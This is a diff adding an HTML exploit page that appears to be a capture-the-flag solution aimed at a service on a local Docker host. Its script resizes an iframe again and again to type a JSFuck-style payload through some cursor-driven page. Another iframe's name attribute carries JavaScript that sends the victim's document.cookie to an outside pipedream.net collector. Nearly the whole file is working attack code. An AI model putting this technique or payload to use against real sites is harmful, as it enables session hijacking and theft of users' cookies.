@@ -1,0 +1,42 @@
+<iframe src="http://172.17.0.1:8082/cursor.html" id="c" style="position:absolute;"></iframe>
+<iframe src="http://172.17.0.1:8082/output.html#CS+[=]" name="q=window.open('http://172.17.0.1:8082/jm7');setTimeout('location=`https://enduols0mwifxdn.m.pipedream.net/?`+q.document.cookie',2000)" onload="s()" width="100%" height="10%"></iframe>
+<script>
+const m = {
+	"C":{"x":140+105*2, "y":140+105*0},
+	"S":{"x":140+105*5, "y":140+105*1},
+	"+":{"x":140+105*11,"y":140+105*2},
+	"[":{"x":140+105*4, "y":140+105*3},
+	"!":{"x":140+105*5, "y":140+105*3},
+	"=":{"x":140+105*6, "y":140+105*3},
+	"?":{"x":140+105*7, "y":140+105*3},
+	"]":{"x":140+105*8, "y":140+105*3},
+}
+const p = "C=[]==[]?!S=+[]==[]?!CS=[C]+S?!SS=CS[S+S+S]?!SC=S+CSS[SS]?!CC=SC[++C+S+++C+S+S]?!CS=SC[C+[+[]]]?!CCC=SC[S+S+S]?!CCS=SC[+[]]?!SSS=C[CC+CS+CCC+SS+CCS+SC[C]+SC[S]+CC+CCS+CS+SC[C]]+C?!CCC+SSS[S+[S]]+SSS[C+[C]]+SC[S+C]???";
+
+function sleep(ms){return new Promise(resolve => setTimeout(resolve, ms))}
+
+async function s(){
+	for(var i=0;i<p.length;i++){
+		c.width = m[p[i]].x;
+		c.height = m[p[i]].y;
+		await sleep(50);
+		c.width = 1;
+		c.height = 1;
+		await sleep(50);
+	}
+	s = () => {return;}
+}
+/*
+C=[]==[]
+S=+[]==[]
+CS=[C]+S
+SS=CS[S+S+S]
+SC=S+CSS[SS]
+CC=SC[++C+S+++C+S+S]
+CS=SC[C+[+[]]]
+CCC=SC[S+S+S]
+CCS=SC[+[]]
+SSS=C[CC+CS+CCC+SS+CCS+SC[C]+SC[S]+CC+CCS+CS+SC[C]]+C
+CCC+SSS[S+[S]]+SSS[C+[C]]+SC[S+C]
+*/
+</script>
